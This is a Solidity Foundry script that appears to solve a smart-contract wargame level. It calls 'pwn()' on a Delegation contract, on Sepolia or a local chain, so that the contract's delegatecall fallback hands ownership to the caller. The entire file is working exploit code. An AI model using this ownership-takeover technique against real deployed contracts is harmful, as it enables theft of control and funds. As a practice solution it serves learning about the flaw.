// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegate, Delegation} from "src/Delegation.sol";

contract DelegationAttack is Script {
    error DelegationAttack__failed_delegation();
    Delegation delegation;
    Delegate delegate;
    address target;
    address attacker = makeAddr("attacker");

    function run() external returns (Delegation, Delegate, address) {
        if (block.chainid == 11155111) {
            target = vm.envAddress("DELEGATION_TARGET");
            delegation = Delegation(target);
        } else if (block.chainid == 31337 && address(target) == address(0)) {
            delegate = new Delegate(attacker);
            delegation = new Delegation(address(delegate));
        }

        vm.startBroadcast(); ////////////////////////////////////////////
        (bool success, ) = payable(address(delegation)).call(
            abi.encodeWithSignature("pwn()")
        );
        if (!success) revert DelegationAttack__failed_delegation();
        vm.stopBroadcast(); ///////////////////////////////////////////////
        return (delegation, delegate, attacker);
    }
}
